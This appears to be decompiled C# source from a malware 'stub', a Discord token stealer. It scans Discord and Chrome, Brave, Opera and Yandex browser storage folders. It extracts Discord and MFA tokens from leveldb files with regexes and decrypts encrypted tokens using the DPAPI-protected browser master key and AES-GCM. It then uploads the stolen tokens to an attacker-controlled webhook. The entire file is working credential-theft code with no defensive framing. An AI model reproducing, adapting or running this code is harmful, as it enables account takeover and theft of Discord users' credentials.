using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Stub
{
	// Token: 0x02000021 RID: 33
	public class DiscordTokens
	{
		// Token: 0x06000062 RID: 98 RVA: 0x00006164 File Offset: 0x00004364
		private static void Scan()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			DiscordTokens.target.Add(folderPath + "\\Discord");
			DiscordTokens.target.Add(folderPath + "\\discordcanary");
			DiscordTokens.target.Add(folderPath + "\\discordptb");
			DiscordTokens.target.Add(folderPath + "\\\\Opera Software\\Opera Stable");
			DiscordTokens.target.Add(folderPath2 + "\\Google\\Chrome\\User Data\\Default");
			DiscordTokens.target.Add(folderPath2 + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
			DiscordTokens.target.Add(folderPath2 + "\\Yandex\\YandexBrowser\\User Data\\Default");
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00006214 File Offset: 0x00004414
		public static List<string> Grab()
		{
			DiscordTokens.Scan();
			List<string> list = new List<string>();
			foreach (string text in DiscordTokens.target)
			{
				if (Directory.Exists(text))
				{
					string path = text + "\\Local Storage\\leveldb";
					DirectoryInfo directoryInfo = new DirectoryInfo(path);
					foreach (FileInfo fileInfo in directoryInfo.GetFiles("*.ldb"))
					{
						string input = fileInfo.OpenText().ReadToEnd();
						foreach (object obj in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
						{
							Match match = (Match)obj;
							list.Add(match.Value);
						}
						foreach (object obj2 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
						{
							Match match2 = (Match)obj2;
							list.Add(match2.Value);
						}
						foreach (object obj3 in Regex.Matches(input, "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\"]*"))
						{
							Match match3 = (Match)obj3;
							string item = DiscordTokens.DecryptDiscordToken.Decrypt_Token(Convert.FromBase64String(match3.Value.Split(new string[]
							{
								"dQw4w9WgXcQ:"
							}, StringSplitOptions.None)[1]), directoryInfo.Parent.Parent.FullName + "\\Local State");
							list.Add(item);
						}
					}
				}
			}
			return list;
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00006454 File Offset: 0x00004654
		public static void GrabTokens()
		{
			foreach (string text in DiscordTokens.tokens)
			{
				Console.WriteLine(text);
				File.AppendAllText(Program.tempFolder + "\\Tokens.txt", text + "\n");
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x0000281F File Offset: 0x00000A1F
		public static string RetrieveTokens()
		{
			DiscordTokens.GrabTokens();
			return Functions.CreateDownloadLink(Program.tempFolder + "\\Tokens.txt");
		}

		// Token: 0x06000066 RID: 102 RVA: 0x000064C4 File Offset: 0x000046C4
		public static void SendTokens()
		{
			try
			{
				File.WriteAllText(Program.tempFolder + "\\Tokens.txt", "\n");
				DiscordTokens.GrabTokens();
			}
			catch
			{
			}
			string webhookURL = Program.WebhookURL;
			string path = Program.tempFolder + "\\Tokens.txt";
			using (HttpClient httpClient = new HttpClient())
			{
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				byte[] array = File.ReadAllBytes(path);
				multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "Tokens.txt");
				httpClient.PostAsync(webhookURL, multipartFormDataContent).Wait();
				httpClient.Dispose();
			}
		}

		// Token: 0x04000094 RID: 148
		public static List<string> target = new List<string>();

		// Token: 0x04000095 RID: 149
		public static List<string> tokens = DiscordTokens.Grab();

		// Token: 0x02000022 RID: 34
		private class Asmodeus
		{
			// Token: 0x04000096 RID: 150
			public static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

			// Token: 0x04000097 RID: 151
			public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

			// Token: 0x04000098 RID: 152
			public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");
		}

		// Token: 0x02000023 RID: 35
		public class DecryptDiscordToken
		{
			// Token: 0x0600006B RID: 107 RVA: 0x00006578 File Offset: 0x00004778
			private static byte[] getMasterKey(string path)
			{
				object arg = JsonConvert.DeserializeObject(File.ReadAllText(path));
				if (DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site1 == null)
				{
					DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site1 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(DiscordTokens.DecryptDiscordToken)));
				}
				Func<CallSite, object, string> target = DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site1.Target;
				CallSite <>p__Site = DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site1;
				if (DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site2 == null)
				{
					DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site2 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "encrypted_key", typeof(DiscordTokens.DecryptDiscordToken), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				Func<CallSite, object, object> target2 = DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site2.Target;
				CallSite <>p__Site2 = DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site2;
				if (DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site3 == null)
				{
					DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site3 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "os_crypt", typeof(DiscordTokens.DecryptDiscordToken), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				return ProtectedData.Unprotect(Convert.FromBase64String(target(<>p__Site, target2(<>p__Site2, DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site3.Target(DiscordTokens.DecryptDiscordToken.<getMasterKey>o__SiteContainer0.<>p__Site3, arg)))).Skip(5).ToArray<byte>(), null, DataProtectionScope.CurrentUser);
			}

			// Token: 0x0600006C RID: 108 RVA: 0x00006684 File Offset: 0x00004884
			public static string Decrypt_Token(byte[] buffer, string path)
			{
				byte[] array = buffer.Skip(3).Take(12).ToArray<byte>();
				byte[] array2 = buffer.Skip(15).ToArray<byte>();
				GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
				AeadParameters aeadParameters = new AeadParameters(new KeyParameter(DiscordTokens.DecryptDiscordToken.getMasterKey(path)), 128, array, null);
				gcmBlockCipher.Init(false, aeadParameters);
				byte[] array3 = new byte[gcmBlockCipher.GetOutputSize(array2.Length)];
				int num = gcmBlockCipher.ProcessBytes(array2, 0, array2.Length, array3, 0);
				gcmBlockCipher.DoFinal(array3, num);
				return Encoding.UTF8.GetString(array3).TrimEnd("\r\n\0".ToCharArray());
			}

			// Token: 0x02000024 RID: 36
			[CompilerGenerated]
			private static class <getMasterKey>o__SiteContainer0
			{
				// Token: 0x04000099 RID: 153
				public static CallSite<Func<CallSite, object, string>> <>p__Site1;

				// Token: 0x0400009A RID: 154
				public static CallSite<Func<CallSite, object, object>> <>p__Site2;

				// Token: 0x0400009B RID: 155
				public static CallSite<Func<CallSite, object, object>> <>p__Site3;
			}
		}
	}
}
